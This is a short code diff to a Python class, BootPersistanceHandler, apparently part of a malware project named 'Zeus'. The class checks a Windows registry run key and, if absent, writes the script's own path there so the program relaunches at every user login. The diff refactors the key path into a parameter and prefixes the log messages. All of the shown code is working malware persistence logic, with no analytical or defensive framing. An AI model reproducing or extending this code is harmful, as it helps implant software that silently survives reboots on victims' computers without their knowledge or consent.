@@ -44,22 +44,20 @@ class BootPersistanceHandler:
             isKeyExistsInRegistry = False
             isKeyExistsInRegistry = self.checkRegistryKey(regPath, "Zeus", os.path.abspath(__file__))
             if isKeyExistsInRegistry:
-                print(r"Zeus already installed in: %s!" % regPath)
+                print(r"[i] Zeus already installed in: %s!" % regPath)
             else:
-                print(r"Implanting Zeus to windows registry to: %s" % regPath)
+                print(r"[i] Implanting Zeus to windows registry to: %s" % regPath)
 
-                didSaveKeySuccessfully = self.setRegistryValue("Zeus", os.path.abspath(__file__))
+                didSaveKeySuccessfully = self.setRegistryValue("Zeus", os.path.abspath(__file__), regPath)
                 if not didSaveKeySuccessfully:
-                    print("Error adding Zeus to windows registry run key.")
+                    print("[e] Error adding Zeus to windows registry run key.")
         except EnvironmentError:
             print(EnvironmentError)
 
-    def setRegistryValue(self, name, value):
+    def setRegistryValue(self, name, value, regPath):
         try:
-            winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.WINDOWS_REGISTRY_START_UP_PATH)
-            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.WINDOWS_REGISTRY_START_UP_PATH,
-                                          0, winreg.KEY_WRITE)
-
+            winreg.CreateKey(winreg.HKEY_CURRENT_USER, regPath)
+            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, regPath, 0, winreg.KEY_WRITE)
             winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
             winreg.CloseKey(registry_key)
             return True
